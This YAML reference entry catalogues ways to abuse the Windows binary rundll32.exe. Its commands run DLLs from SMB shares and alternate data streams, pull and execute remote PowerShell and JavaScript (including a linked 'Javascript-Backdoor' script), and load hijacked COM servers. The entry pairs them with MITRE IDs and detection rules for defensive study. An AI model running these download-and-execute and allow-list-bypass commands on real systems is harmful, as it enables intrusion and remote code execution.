---
Name: Rundll32.exe
Description: Used by Windows to execute dll files
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: rundll32.exe AllTheThingsx64,EntryPoint
    Description: AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.
    Usecase: Execute dll file
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
    Description: Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.
    Usecase: Execute DLL from SMB share.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
    Description: Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.
    Usecase: Execute code from Internet
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
    Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe.
    Usecase: Proxy execution
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
    Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.
    Usecase: Proxy execution
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
    Description: Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.
    Usecase: Execute code from Internet
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain
    Description: Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).
    Usecase: Execute code from alternate data stream
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: rundll32.exe -sta {CLSID}
    Description: Use Rundll32.exe to load a registered or hijacked COM Server payload.  Also works with ProgID.
    Usecase: Execute a DLL/EXE COM server payload or ScriptletURL code.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows 10 (and likely previous versions)
Full_Path:
  - Path: C:\Windows\System32\rundll32.exe
  - Path: C:\Windows\SysWOW64\rundll32.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/network_connection/sysmon_rundll32_net_connections.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_rundll32_activity.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml
  - IOC: Outbount Internet/network connections made from rundll32
  - IOC: Suspicious use of cmdline flags such as -sta
Resources:
  - Link: https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
  - Link: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
  - Link: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  - Link: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
  - Link: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
  - Link: https://github.com/sailay1996/expl-bin/blob/master/obfus.md
  - Link: https://github.com/sailay1996/misc-bin/blob/master/rundll32.md
  - Link: https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
  - Person: Jimmy
    Handle: '@bohops'
  - Person: Sailay
    Handle: '@404death'
  - Person: Martin Ingesen
    Handle: '@Mrtn9'
---
